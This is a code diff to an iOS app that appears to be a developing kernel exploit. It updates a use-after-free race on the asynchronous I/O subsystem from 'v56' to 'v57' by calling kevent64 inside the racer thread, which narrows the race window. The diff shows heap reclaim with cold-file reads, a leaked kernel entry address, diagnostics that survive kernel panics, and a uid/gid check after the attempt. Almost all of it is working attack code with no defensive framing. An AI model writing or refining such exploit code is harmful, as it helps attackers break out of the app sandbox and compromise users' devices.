@@ -262,6 +262,9 @@ struct v56_race_state {
     struct aiocb *rcbs;
     int nrcbs;
     ssize_t return_result;     // aio_return result or aio_read errno
+    int kq;                    // v57: kevent64 inside racer
+    int nev;                   // v57: kevent64 result
+    struct kevent64_s kev;     // v57: kevent64 event data
 };
 
 struct v56_state {
@@ -295,10 +298,10 @@ static void aio_set_thread_affinity(int tag) {
                       (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
 }
 
-// v56 racer: spin aio_return directly — one syscall not two (no aio_error).
-// aio_return returns EINPROGRESS until I/O done, >=0 if we win unref race,
-// EINVAL if worker already freed. Same-CPU LIFO reclaim after winning.
-static void *v56_racer(void *arg) {
+// v57 racer: spin aio_return, reclaim, then IMMEDIATELY call kevent64
+// inside the racer thread — ZERO inter-thread delay between reclaim and kevent64.
+// Worker hasn't even picked up rcbs[0] from workq yet when kevent64 fires.
+static void *v57_racer(void *arg) {
     struct v56_race_state *s = (struct v56_race_state *)arg;
     aio_set_thread_affinity(42);
 
@@ -319,6 +322,11 @@ static void *v56_racer(void *arg) {
                 if (ok == s->nrcbs)
                     atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
             }
+            // kevent64 IMMEDIATELY after reclaim — entry just created, worker
+            // hasn't started rcbs[0] I/O yet. Zero delay = zero race window.
+            if (s->kq >= 0) {
+                s->nev = kevent64(s->kq, NULL, 0, &s->kev, 1, 0, NULL);
+            }
             return NULL;
         }
         // EINPROGRESS: keep spinning. EINVAL: worker freed, keep trying.
@@ -327,8 +335,9 @@ static void *v56_racer(void *arg) {
     return NULL;
 }
 
-// v56: v44 architecture — racer AFTER lio_listio, spin aio_return, cold file reclaim.
-static void *v56_exploit_thread(void *arg) {
+// v57: kevent64 moved INTO racer — fires ~0.5us after aio_read reclaim.
+// Eliminates ~400us main-thread delay that let worker free entry first.
+static void *v57_exploit_thread(void *arg) {
     struct v56_state *st = (struct v56_state *)arg;
     aio_set_thread_affinity(42);
 
@@ -353,8 +362,6 @@ static void *v56_exploit_thread(void *arg) {
     char rbufs[V56_NRECLAIM][8192];
     for (int i = 0; i < V56_NRECLAIM; i++) {
         memset(&rcbs[i], 0, sizeof(rcbs[i]));
-        // rcbs[0]: 128MB cold file (slow I/O → entry stays alive for kevent64)
-        // rcbs[1..7]: small cached reads (fast, just fill workq)
         rcbs[i].aio_fildes = (i == 0) ? st->fd_cold : st->fd_small;
         rcbs[i].aio_buf = rbufs[i];
         rcbs[i].aio_nbytes = (i == 0) ? 8192 : 4096;
@@ -363,14 +370,16 @@ static void *v56_exploit_thread(void *arg) {
         rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
     }
 
-    // Start racer first (spins on aio_return)
+    // Start racer first (spins on aio_return, will call kevent64 itself)
     struct v56_race_state rs = {};
     rs.trigger = &tcb;
     rs.rcbs = rcbs;
     rs.nrcbs = V56_NRECLAIM;
+    rs.kq = kq;
+    rs.nev = -1;
 
     pthread_t thr;
-    pthread_create(&thr, NULL, v56_racer, &rs);
+    pthread_create(&thr, NULL, v57_racer, &rs);
     atomic_store_explicit(&rs.start, true, memory_order_release);
 
     // Submit trigger I/O — racer is already spinning
@@ -390,14 +399,14 @@ static void *v56_exploit_thread(void *arg) {
     st->freed = freed;
     st->reclaimed = reclaimed ? V56_NRECLAIM : 0;
     st->return_result = ret_result;
+    st->nev = rs.nev;
+    if (rs.nev > 0) st->kev = rs.kev;
 
     if (freed != 2) {
-        // Race lost — clean up safely
         while (aio_error(&tcb) == EINPROGRESS) usleep(500);
         aio_return(&tcb);
         close(kq);
         st->kq = -1;
-        // Write diag AFTER kevent64 decision (no race with worker)
         if (st->diag_path[0] != '\0') {
             int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
             if (dfd >= 0) {
@@ -405,9 +414,7 @@ static void *v56_exploit_thread(void *arg) {
                 int dlen = snprintf(dbuf, sizeof(dbuf),
                     "freed=%d reclaimed=%d ret=%zd\n",
                     freed, reclaimed ? 1 : 0, ret_result);
-                write(dfd, dbuf, dlen);
-                fsync(dfd);
-                close(dfd);
+                write(dfd, dbuf, dlen); fsync(dfd); close(dfd);
             }
         }
         return NULL;
@@ -423,19 +430,14 @@ static void *v56_exploit_thread(void *arg) {
                 int dlen = snprintf(dbuf, sizeof(dbuf),
                     "freed=%d reclaimed=%d ret=%zd\n",
                     freed, 0, ret_result);
-                write(dfd, dbuf, dlen);
-                fsync(dfd);
-                close(dfd);
+                write(dfd, dbuf, dlen); fsync(dfd); close(dfd);
             }
         }
         return NULL;
     }
 
-    // kevent64 IMMEDIATELY — NO logging, NO diag, NO fsync before this!
-    // rcbs[0] cold I/O is still in progress (128MB F_NOCACHE) → entry ALIVE.
-    st->nev = kevent64(kq, NULL, 0, &st->kev, 1, 0, NULL);
-
-    // Write diag AFTER kevent64 (entry already read, safe to delay now)
+    // kevent64 was already called inside racer — result in st->nev / st->kev
+    // Write diag AFTER everything
     if (st->diag_path[0] != '\0') {
         int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
         if (dfd >= 0) {
@@ -443,17 +445,17 @@ static void *v56_exploit_thread(void *arg) {
             int dlen = snprintf(dbuf, sizeof(dbuf),
                 "freed=%d reclaimed=%d nev=%d ret=%zd\n",
                 freed, reclaimed ? 1 : 0, st->nev, ret_result);
-            write(dfd, dbuf, dlen);
-            fsync(dfd);
-            close(dfd);
+            write(dfd, dbuf, dlen); fsync(dfd); close(dfd);
         }
     }
 
     // Cleanup: wait for and aio_return all rcbs
-    for (int i = 0; i < V56_NRECLAIM; i++) {
-        while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
-        if (aio_error(&rcbs[i]) != EINVAL)
-            aio_return(&rcbs[i]);
+    if (st->nev <= 0) {
+        for (int i = 0; i < V56_NRECLAIM; i++) {
+            while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
+            if (aio_error(&rcbs[i]) != EINVAL)
+                aio_return(&rcbs[i]);
+        }
     }
 
     return NULL;
@@ -525,7 +527,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v56" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v57" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5911,7 +5913,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v56 (v44 Architecture Revival) =========="];
+    [self appendLog:@"\n========== AIO UAF v57 (kevent64 in Racer) =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5923,12 +5925,12 @@ static void *e2_free_and_ool_racer(void *arg) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // v56: Diagnostic in Documents (persists across kernel panic / reboot)
+    // v57: Diagnostic in Documents (persists across kernel panic / reboot)
     NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v56.txt"];
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v57.txt"];
     unlink(diagPath.UTF8String);
 
-    // v56: TWO files — small (4KB cached) for tcb trigger + rcbs[1..7],
+    // v57: TWO files — small (4KB cached) for tcb trigger + rcbs[1..7],
     // cold (128MB F_NOCACHE) for rcbs[0] to keep entry alive through kevent64.
     NSString *pathSmall = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_small.bin"];
     int fd_small = open(pathSmall.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
@@ -5936,7 +5938,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create small file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v56" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v57" forState:UIControlStateNormal];
         });
         return;
     }
@@ -5953,7 +5955,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         close(fd_small);
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v56" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v57" forState:UIControlStateNormal];
         });
         return;
     }
@@ -5971,8 +5973,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v56: v44 architecture (spin aio_return, cold reclaim, immediate kevent64) ----
-    [self appendLog:@"\n--- Phase A v56: spin aio_return + cold reclaim + immediate kevent64 ---"];
+    // ---- Phase A v57: v44 architecture + kevent64 in racer (zero inter-thread delay) ----
+    [self appendLog:@"\n--- Phase A v57: spin aio_return + cold reclaim + kevent64 in racer ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
@@ -5986,7 +5988,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         strncpy(st.diag_path, diagPath.UTF8String, sizeof(st.diag_path) - 1);
 
         pthread_t thr;
-        pthread_create(&thr, NULL, v56_exploit_thread, &st);
+        pthread_create(&thr, NULL, v57_exploit_thread, &st);
         pthread_join(thr, NULL);
 
         // Read diagnostic file
@@ -6048,8 +6050,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v56: Health check ----
-    [self appendLog:@"\n--- Phase C v56: Health check ---"];
+    // ---- Phase C v57: Health check ----
+    [self appendLog:@"\n--- Phase C v57: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6077,11 +6079,11 @@ cleanup:
     unlink(pathSmall.UTF8String);
     unlink(pathCold.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v56 Complete =========="];
+    [self appendLog:@"========== AIO UAF v57 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v56" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v57" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
